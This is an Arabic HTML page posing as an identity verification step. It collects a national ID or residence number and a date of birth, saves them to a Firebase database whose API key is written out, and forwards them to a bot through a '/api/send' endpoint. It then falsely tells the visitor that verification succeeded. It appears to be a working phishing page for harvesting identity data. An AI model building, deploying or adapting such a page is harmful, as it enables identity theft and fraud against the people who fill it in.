<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التحقق من هويتك</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #ffffff; display: flex; justify-content: center; align-items: flex-start; height: 100vh; margin: 0; padding-top: 50px; }
        .container { width: 100%; max-width: 400px; padding: 20px; }
        h2 { font-size: 24px; margin-bottom: 30px; }
        .input-group { margin-bottom: 20px; border: 1px solid #eee; border-radius: 12px; padding: 15px; background: #fafafa; }
        .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; }
        .input-group input { width: 100%; border: none; background: transparent; outline: none; font-size: 16px; color: #333; }
        .btn-continue { width: 100%; padding: 16px; border-radius: 12px; border: none; background-color: #1a1a1a; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>

<div class="container">
    <h2>التحقق من هويتك</h2>
    
    <div class="input-group">
        <label>الهوية الوطنية أو الإقامة</label>
        <input type="number" id="idNumber" placeholder="1123482869">
    </div>

    <div class="input-group">
        <label>تاريخ الميلاد</label>
        <input type="date" id="birthDate">
    </div>

    <button id="submitBtn" class="btn-continue">استمرار</button>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
    import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
        projectId: "barq-9ba61",
        // ... ضع باقي بيانات الإعدادات هنا
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    document.getElementById('submitBtn').addEventListener('click', async () => {
        const idNumber = document.getElementById('idNumber').value;
        const birthDate = document.getElementById('birthDate').value;

        if (idNumber && birthDate) {
            // 1. الحفظ في Firebase
            await addDoc(collection(db, "identity_verifications"), {
                idNumber,
                birthDate,
                timestamp: serverTimestamp()
            });

            // 2. الإرسال للبوت (عبر Vercel API)
            fetch('/api/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: `هوية: ${idNumber} | تاريخ الميلاد: ${birthDate}` })
            });

            alert('تم التحقق بنجاح');
        }
    });
</script>
</body>
</html>
